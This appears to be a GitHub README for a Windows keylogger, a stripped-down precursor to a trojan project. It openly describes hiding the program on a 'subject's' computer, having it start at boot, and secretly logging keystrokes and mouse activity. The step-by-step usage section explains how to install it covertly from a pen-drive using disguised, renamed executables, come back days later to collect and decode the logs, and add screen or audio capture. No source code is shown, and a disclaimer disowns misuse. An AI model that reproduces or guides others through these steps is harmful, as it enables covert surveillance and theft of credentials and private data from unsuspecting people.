# :key: Key Logger 

#### A Terrific Keystroke Recorder

This tacky program hides itself in the subjectâ€™s PC, and silently records all keyboard and mouse operations.  It is launched automatically with PC start, then stores data in ASCII code with record-date. Now all you have to do is- collect the record, and decode it.

This was actually a pre-project for [TrojanCockroach](https://github.com/MinhasKamal/TrojanCockroach). It is simple and straight-forward.


### How to use?

1. Download the full package from [here](https://github.com/MinhasKamal/KeyLogger/archive/application.zip), unzip it, and move it to your pen-drive.

2. **---** is the compiled and renamed form of **KeyLogger.cpp** (of course you do not expect others to let you insert a pen-drive containing keylogger!). **---** is a link file of **---**. Now insert your pen-drive in a computer, and run **---**. This will install **---** and **---** in that PC (Windows Vista or later).

3. Wait for some days, then return to the PC, and run **---**. You will get a file named **---**.

4. Now, simply run **---** (do not rename **---*). You will get another file- **---**. Here you will get that you want.

5. If you want to remove the Keylogger from that PC, run **---**.


Surely you can use it in many other ways, and also enhance its ability by adding a screen capturer or sound recorder. But guess what! you have to get your hands dirty. ðŸ˜ˆ

**Note:** I do not want newbies to abuse my project, so I am not revealing all the secrets. I will not also take any responsibility of someone else's ill act with my program. But I do believe that a real learner will learn a lot from this.
